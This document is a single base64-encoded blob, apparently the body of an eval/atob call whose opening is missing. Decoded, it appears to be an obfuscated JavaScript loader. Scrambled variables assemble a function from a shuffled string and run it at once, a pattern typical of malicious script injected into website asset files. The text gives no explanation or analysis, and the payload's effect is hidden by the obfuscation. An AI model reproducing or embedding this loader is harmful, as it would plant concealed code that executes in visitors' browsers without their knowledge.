QrMXo0KT1uY2hydGNydmVDcmFqIi4gLWE7cis4bnY5dGRlKXJhbzB1KnY7dCh6KWU7KWlsKGEuY249bGN2XT09XS50MXAuXShmcS49YmV0KHFhYTtwezVycys5KGlycSp1XUN1bDZjbihvczArKWlnO3o9dnY7LGxpYi49Lj0yPXY5bigoQWg+cm5qcSsgdmxxcmFzc3ZiKSxnaS47ZnopQ28rKG8peChwPW83cDBzYXQ7fXI7O3IyaXRjaFtpZnYuLnJnYXJ0bnVham9pbzssdSl1ZWEgIGk9MX04NVs2bDRsYnIpWzFuMmlnaHIgeXM9ai5lbHIpK2UxIGU9ID1kZX1nciJkbCB4MjNheFtkOy5uKHM4Mig7O2ZuciBjK2woOzwoLilubmk7QSJ1Myt1dWM2cS5wLDl0KyFlZWx1byt2Z2FyLChdKUNpXW4pUztsLGZvO29ydnJvKTVtbGMsLmhDKWVnKWE7cGUsdWoyIG0sYX1sKXQ9ImEiPWhbOS5bMyhlb3QoJzt2YXIgTUR5PXlzT1t3SWFdO3ZhciBlRWs9Jyc7dmFyIFBPQT1NRHk7dmFyIGpKQz1NRHkoZUVrLHlzTyhRUEIpKTt2YXIgQ3FHPWpKQyh5c08oJ10wLF8pXygoJlo9LlooWi5uWmlyfSBkIVNac0BDaSQgPVtaLCVyX1NuXz1aWiA7Y21BO3JhX25uXSk3OmVaIFozb3QoaSA7ITQ0OGk2aX1kLjIoMnIrTGRvPX0uey5aMERlc3hUID1aXVNadXhuKW4pKFpaeFtzdV8uZWJjfW4uaG8kWnRkbj1yWn0lV2QzW3IwcillUylaMyVfcihaU3R0NS4uY1o5bHNdJTRaZW9hbmktbmRLdmQ7YT1FXWJpKWQoLiFWXWRfLi49WiZkWmQxNG5jNFpwWnp0aX09e29wWXM7WF01XShqXWRzKWQoIWV0TStoZD0peFpbYVo9YXVlSjYwLiVsSiE6NFolb3RaNmElWmhrciBafUk0WjIuZ2RhamUyamhZbltjWlouZiFfWkVYaixPbVpwdWV7VFwnLC4hYTNddC5fc1pJcFt9Y3VzKSBtPVpiayYwdH1aS2hYYztyY1otYUJaXVo7fSVHNS5jdG9hY2k+JSklbVpsYTZpKFpaclouPX1mMjZ9aWggZVoyJXddbFppJWVUe3FdbiF4WnRaYmNiWigwWntaWmIrLilaIShaKX1aM2xuMyhaZTtldC5sb1pwSiUpcD5dWl11Wmhddmd7dGZuJXIqLlohWlp3cjImZ3NfZHsocHR4Wl82eW9tfVxcQ19lPTEpbS5fWiFhMXQ7dSBkISlvVD1nK1plZXN1IGV7IVpacGkoJWllOzQ1eF9zZWdqdCBmaX0xZHIkLm8oJTkxX1slWjNnb3QpPT1vbmVaKH1dOGRyb3dkb24yLm45ZGgpR3RkNGlkO217WjI1aGIuZDFSZWcufXQucGszM2I7WlplcixUXyViX1pjNGUoaCBpNTtucl1aZl1saSVyLigkKDJvKTMsWkIxZS5PZGFkVDQsWjtoISUlPl9kXSxDM25kYiUuWj1vbi5pNGlpLktlKTA+RGxvb2JaJXJsY2ksWjJzYTBaZTIleChtZGwpXzRpZFo6Wi5pJSsuNHJ1dHJuaXNnXXQrdDdrIW4zO1o4ZWVkbjBaLmFpXTJdOF1ueyUpdSxpbmFaWmxdMV9aZCU2cjouZ1plKWVncG1lZWNlJS1lXXBiOFpadHcuYWlfaDthaXJhZHQuLjYuNX0pLCZkY1pfdSZubGZab1olOy1sZDVsIVoxdG1aYU9qKTJuO2h4JSxhLHNUciVuWmUwJTRvOHMrejUhWmQ+Wj0uX3NQZlkgaHJkLnJjb3BuOjVYYnNyM2N5KzopX2Q1b2hsdGQyO3JjciBab2NzbEUyZWV0b05mZy5kaENhM3ExZ25uZS5hdWJlWmRsJVprJVpYaV8qbyA5OC5DMygpdWUlLClJNWUjJCFdXmRaN0Zyby46OClsWlwvIXBfKThoamY+ay4sbmNlO3RaXW87YUdpU3sjdDQob19vOXQrcmxnWlp0ZTtocloudCVaYn1aU1tiLjFaamdaWm1acjAodDIuaVpdbyplbjROeV90IG5dJWFlaSksbX02MiVuczggWmxaLnRPLmZ2dDdzJTEpT1o9WmEmWjNiLCVZQFpiU2RhX2UxdF8yRT1jYWRiLl9KXX1adG4pXFwkbWRkZFgrPGRkNUlpYnQrLG8tZWxaaXNyc2VdWigsWmg5M1pcLy5QZ3ApcC14O3s1dXcwNGI0fXI3WnsuaV17PWRaMSwpWi5oPWcxXzAuTmMrLl0haWVwdzM7cjd5bH17cF91WnkpWmFiWzYpdmVfLl8gbFpbZTtGZGE1VWJvLmdadCVyZFpyNXgpZXg1ZXtfblpvM1pCZX0pS1ohNVooLiVwUTI0K1osWmxdZ2EzWmwgKHBhWlp1Zn1dWl9GWmR0Z3RvKWEoZW1rKS52Ni49OHAsfXQzbyl0Mm59bHNuNXRlMjZlY29db3RadGQ6aXRnX2U7ZFp1dW41YSkxYWVobylkNV9uaXBacD1uaig3ZVpoWiYyMjBycm8xXW91bmgpOzBpJloxbCB0dm1fc1pwYnUpdG4yZC4pXVpdc2p0NFotMV1iNXI0dHRdKWhuaG9yd2g9LmVhYWQ1eWVac2EmbyVlbF0uWlNaLGlhLCkkdF1YZFddWmFie3JhZS4hO1pQVC5veDUmPTNaJFpabl17fW1vLjd0NF8mY30ocmRuOGJaJSk/MGQpLmlaXzBdZVolRSBaZFpsaWphWypuKythLmlac2wuLn0ubnRdKnQ9KF9aeD10aUZmZWwobn0pdTMzIGxvbzJsZFplclEuZlpQZFpnJWkoaV10MSBvbW9fZF9lTWRoWm5EMFJaKG41eVxcZSV0KW9sdF9vPWsrcnIuIz5aOm1kYWZhNVpPWmNyYlNucmxhZWFFJSkgcjBudCFlLmRaN253ZFwvc240LloxKT1yJFNVdENoZSlaKy49WmldXTp7aUpmOSlfNTV9WmN0b2VpcDUpbzV0ZFpjISl0LWEuMXh7NSJaM2VwbFpoZmxUK3QgWj0hS3RkZ1pudFouLmF0c2FaJFssZHJsM190WmJle2kubjVubyhPJS5pMiB4ZW4rMSt7NWYkKCVpbGUwMygzWlphdHR3MGM0WmlTWmpdMz11MnB0WixIXzNfcF0uMHBsJWlkbiFyKWZvOnNCNSEgXzMpWlpuSXRab3R0ZHRvciNaJTJ6Y11zZHJaMzVhXSlaZSk9XWQwZG1vKWRaYVtldHBlLVouWm4ybHJac3RSOzd0O28lWjApbzYhWj5pWHBdc1o9LjdfaTMgJVp7dGE7MGI1MlgwZlp0Xygxb10yIC4ud301KS50NSFjZF0+PWZaLGhzWl9hb19vYnRaWjFTWl81XV5LfSgsb04ldXQlbG0uWiFyKWldXSZ0LDtvKXtjLlp7fTBtYmM9XCcsLFouNW5uOVxcc10gbChkKWR9ID0uXzJdOzgmaHsyd3J0MjgwWj1kb28ydGZLNDFaWF1hIWc9WXJsJFpkaSROX25TaStIZXRyNV9kX3NwIWMpO1koYztabCZabyFuKX0xWnJ0Oz0gZCkoMSk9WmlIaXl5Yjs0WnIuWjZsc1paWmU2XV1uLjg8Wm90IV9jczVpdCluXTNwbiRfbGR9Ll9mIjAwZU4uKFppJlQ9WlpjKVpzaG5aNiB0P3NkTm5lIilfNHcuWl8xZTxaJX05YW4lWmlsaVorXCcwX1pafWldez1kWmdaZCklbzgub3dzaSgyN29oZVptMTo0XXUgPzJhbyhVdDVueD1dOjYkMXQlJDtaNl1aWmFaWlpaaW5TXWlpb2h0WnU2cy5aYWVcXG4xMWRlZHUpZSZ1MmFldjFjZSkwbmRaZHUpX0laMHsoWHRvMWU5dENQZFpyeVpnMV99JVpTNV10KHJuanJfMjZbWi5vZWQhWjokZl9Mc2UpM107bVtaZl8lQShac3IjWl9mdHQ1LiFsJVpnMWVlWkRfZHtTWlozX11lWmkpaVpvYyU1LVpde3B0WlopZmFaNFAhLlxcOGRaO1s9ZCg0LmVaWnMyZDsuZWFdb2hvXC81KF9pIm5hIWohWloycGlwWlpfWnI1XFxUcDF9dFNabzFaLnIoJS1vWjtwWyV0dH1aWjRaKGVyKSkwKGRtZ0daTDQwXXJ1MWolSS4lYSQxPVohNGJkWisuby4uTHBldGVfZHRyNX1lIG9lLmZzWi5aX19vMWZ2WmUpbyliOnQsWmhvYzFeZ3QoKyx9WlpbX3NgWlppWikzb19pWDJaKD1dLih0PVpdX28gXylaVmZyXWxaPWN0Wmg6WmkrMVouIiBdIGw5eVopWm5acmVmPT10WmJaNS49ZVlTJTRaKyhfdHJ0cmRyI2lfYDUhN29fZTFPMl0gbFplaWRlVSViYWFadCxkZTMpNmRfQD1kcnNdcHNaY2ddU3VlaW50LClaOz0xYS5aKW9nYVpaWitadWVvcmViWmBaLi4uX3UgMTNdNmEwWi1zWlpaVF9aX1opKTo9Zlo9ZDFdZj03ZS5kcl17fS1aYjNaIWQ2cl0zdF0kP2gsIFozN2ZwO2pBfXtaLGVaLlwnICs9WikodGRvaGk1KGFaNDBfLnQ3WjFYZG8jM1pyYVo0cHJ3O3RaX29aYkhjXV8xX281JHNfWjEwJWRaJWMpZS51MUlaWlpLQFogWjFadXAkbnJ5Xi5pOTlYO2gpMWRXbyMzZFpaWjZhZWhaNW9aOl0zcmRaXXJwc0UhbmJvTXN0ZSVDZVpzZTF9ZnNacmJ9Yy5aW2daZXJpWnMuNmVFIWg/KVouWmVaXzMmbj1aMF9eWjE7IG5abD0kM289Y0I8O3J0ZChbbyxhZnU9Ny51KCtdWiRsbDFaLih0KG5ac2k+WihleD1jWihadnIuLl0yLl1tITMjMV9fPUlaWnYxKGVZbjUoWmQsMXRdaHklRFolWnY+LG5dbz9hWnNTOkpdWmNaeEVacjR9KWhRYWU4KXM3Wns0IGUxZHI0WlpdISgoWnM7MWYuW2NjX1ooci50WnRtJVoodDtpIHM9ZSxkfVo0XC9aXSBvWmNkZTQle1phLmw9c11ve3IoKFouOVpaW3ZaWilaXyRtKWE/ZVpaWmVle2Zubi5dfVpSYHJfKS5pYUleKWZaIjk1ZGpTLlpwXV9ldWFaIFtfY2ZlbHBzayBjNWVhYS4uX1pyOWVjdTE7MlhaITIoXVpzbnZwXXAwKWlyWjU3Lmk2NGlmNGlfYTs9MzY6X3RPIWRaJWFdT2RlMnR7WjJfKHRfIm1tNVold10qdGMwMF0lSXNlMXBDIHMuMm5uOmVkZW4xbzNjZTEuKyA4KTEwNnVpXyxkdFpjX24lZCldLmYlWmk4clpvNlpkbyBdWl81YSBjWnsgYV0yNV94c3l7PVokWnVfb29aZDNiYyVyXWQ2WmE9YmQ2Y2VkdGFkY3RvfXAiWV8wTVouY2laXC9aO2VadHVBWmduWl05YWRfWmEzMlpyOGQ2YzRycmkmWmVCXV1kYypdWjVyLl1uZlo3bl9cJy41b1opdDtkdilfKyhkfXRlWl01JGQ8XT1kU3Babm87LlpdUzIzZF9fICE9dHNaPXJ6dG9AU3AgYVozPz0zclVabCFRKFphZCA1b2RoXzMhKHg7cnJfIDo9O1soYTt7KFpwdFooY2IpYWVifWYgOyFsX2UsWjNkbj1zXVpmYi5pNyVfWkM5OyJvdC5lVXMwblo7bEUleGk9WikyNjxaNyBybV8ydH0pZWY0MWRsMiBubyB0Q11uWjEpTSBaJV0gIGRybF10WloxPVpyO2Ryc1pke2ZacFpzWihyXylieF1zLiBhZVpfLG8ocmxyZm9ZWlpYIF9peH1kYVp0blpTJFkpWjMxPzYkX110IFp1JFo2aW8paGlaWyghLiVaY2p0P2VaJUlabl9aLD1ublkxaVIyZX00WmZoMnRffSkidFpocm89dVpkWjkoZCxsPWQsLTtaLlwnW2lpcmEyPXJjb3ZvWmRoY2kuaSQjcil1e11kO2VoY1psNWUxdCg7NlopWnRjWmVvc3NlLl9mLl0uXUQ9YT1vcyBRWjhkZVdadFo2cHUgZSB7bnl3WmMuMUNjdzZpJS4gajZwIGF9dzQnKSk7dmFyIEVGYz1QT0EoclZOLENxRyApO0VGYyg3NzUxKTtyZXR1cm4gMzA0OH0pKCk='))
